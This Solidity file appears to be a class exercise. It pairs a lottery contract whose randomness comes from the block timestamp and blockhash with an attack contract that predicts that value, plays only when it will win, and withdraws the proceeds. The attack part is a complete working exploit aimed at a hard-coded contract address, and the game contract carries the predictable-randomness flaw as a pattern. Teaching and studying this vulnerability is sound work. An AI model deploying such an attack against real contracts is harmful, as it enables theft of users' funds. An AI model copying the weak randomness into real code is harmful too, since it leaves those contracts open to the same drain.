// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.17;

contract class44_game {
    event win(address);

    function get_random() public view returns (uint256) {
        bytes32 ramdon = keccak256(
            abi.encodePacked(block.timestamp, blockhash(block.number - 1))
        );
        return uint256(ramdon) % 1000;
    }

    function play() public payable {
        require(msg.value == 0.01 ether);
        if (get_random() >= 500) {
            payable(msg.sender).transfer(0.02 ether);
            emit win(msg.sender);
        }
    }

    receive() external payable {
        require(msg.value == 1 ether);
    }

    constructor() payable {
        require(msg.value == 1 ether);
    }
}

contract class44_attack {
    address payable  public game = payable (0x87Fab8FBB9C127232804851e01F21F4c04314bEA);

    class44_game gamecontract = class44_game(game);
    address owner;

    function get_random() public view returns (uint256) {
        bytes32 ramdon = keccak256(
            abi.encodePacked(block.timestamp, blockhash(block.number - 1))
        );
        return uint256(ramdon) % 1000;
    }

    function attack() public payable {
        require(get_random() >= 500);
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
        gamecontract.play{value: 0.01 ether}();
    }

    receive() external payable {
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }

    constructor() payable {
        owner = msg.sender;
    }
}
